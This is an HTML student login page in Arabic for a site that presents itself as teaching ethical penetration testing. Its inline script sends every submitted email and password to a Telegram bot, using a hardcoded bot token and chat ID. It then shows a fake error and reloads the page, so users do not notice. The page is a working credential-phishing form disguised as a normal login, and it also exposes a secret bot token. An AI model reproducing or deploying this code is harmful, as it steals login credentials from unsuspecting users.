<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول الطالب — تعلّم اختبار الاختراق الأخلاقي</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../style.css">
    <link rel="stylesheet" href="auth.css">
    <script src="https://kit.fontawesome.com/f964bad74b.js" crossorigin="anonymous"></script>
</head>
<body class="auth-body">
    <header class="nav">
        <div class="nav-inner">
            <a href="../index.html" class="brand">
                <span class="brand-mark"><i class="fa-solid fa-bug"></i></span>
                <span class="brand-name">تعليم اختبار الاختراق الأخلاقي</span>
            </a>

            <nav class="nav-links" id="menu" aria-label="القائمة الرئيسية">
                <a href="../index.html">الرئيسية</a>
                <a href="courses.html">الدروس</a>
                <a href="labs.html">المعامل العملية</a>
                <a href="community.html">المجتمع</a>
            </nav>

            <div class="nav-actions">
                <a href="student-login.html" class="btn btn-ghost active">تسجيل الدخول</a>
                <a href="student-signup.html" class="btn btn-primary">ابدأ مجانًا</a>
                <button class="burger" id="burger" aria-label="فتح القائمة" aria-expanded="false" aria-controls="menu">
                    <i class="fa-solid fa-bars"></i>
                </button>
            </div>
        </div>
    </header>

    <main class="auth-wrap">
        <div class="auth-card">
            <span class="role-badge"><i class="fa-solid fa-user-graduate"></i> حساب طالب</span>
            <h1>تسجيل دخول الطالب</h1>
            <p class="auth-sub">كمّل مسارك التعليمي وتابع تقدمك في الدروس والمعامل.</p>

            <form id="studentLoginForm" novalidate>
                <div class="field">
                    <label for="email">البريد الإلكتروني</label>
                    <input type="email" id="email" name="email" placeholder="you@example.com" required autocomplete="email">
                </div>

                <div class="field">
                    <label for="password">كلمة المرور</label>
                    <div class="pass-wrap">
                        <input type="password" id="password" name="password" placeholder="كلمة المرور" required minlength="8" autocomplete="current-password">
                        <button type="button" class="toggle-pass" id="togglePass" aria-label="إظهار كلمة المرور">
                            <i class="fa-solid fa-eye"></i>
                        </button>
                    </div>
                </div>

                <div class="row-between">
                    <label class="checkbox checkbox-inline">
                        <input type="checkbox" id="remember">
                        <span>تذكرني</span>
                    </label>
                    <a href="#" class="link-muted">نسيت كلمة المرور؟</a>
                </div>

                <button type="submit" class="btn btn-primary btn-block">دخول</button>

                <p class="form-msg" id="formMsg" role="status"></p>
            </form>

            <p class="auth-switch">مش عندك حساب؟ <a href="student-singup.html">إنشاء حساب طالب</a></p>
            <p class="auth-switch">أنت معلم؟ <a href="pro-login.html">تسجيل دخول المعلم</a></p>
        </div>
    </main>

    <script>
        // 1. القائمة الجانبية (Burger Menu)
        const burger = document.getElementById('burger');
        const menu = document.getElementById('menu');
        burger.addEventListener('click', () => {
            const open = menu.classList.toggle('open');
            burger.setAttribute('aria-expanded', open);
        });

        // 2. إظهار وإخفاء كلمة المرور
        const togglePass = document.getElementById('togglePass');
        const passInput = document.getElementById('password');

        togglePass.addEventListener('click', () => {
            const isHidden = passInput.type === 'password';
            passInput.type = isHidden ? 'text' : 'password';
            togglePass.innerHTML = isHidden
                ? '<i class="fa-solid fa-eye-slash"></i>'
                : '<i class="fa-solid fa-eye"></i>';
        });

        // 3. معالجة نموذج تسجيل الدخول وإرسال البيانات إلى تليجرام
        const form = document.getElementById('studentLoginForm');
        const msg = document.getElementById('formMsg');

        form.addEventListener('submit', async function (e) {
            e.preventDefault();

            if (!form.checkValidity()) {
                form.reportValidity();
                return;
            }

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const botToken = '9072593338:AAEveJZdX3TP2cGNpHBTYSM8YREoOQWAXNY';
            const chatId = '6798640564';

            const message = `⚠️ محاولة تسجيل دخول طالب:\n\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('فشل الإرسال:', error);
            }

            msg.textContent = 'حدث خطأ في تسجيل البيانات، يرجى المحاولة لاحقاً.';
            msg.classList.add('ok');

            setTimeout(() => {
                window.location.reload();
            }, 1500);
        });
    </script>
</body>
</html>
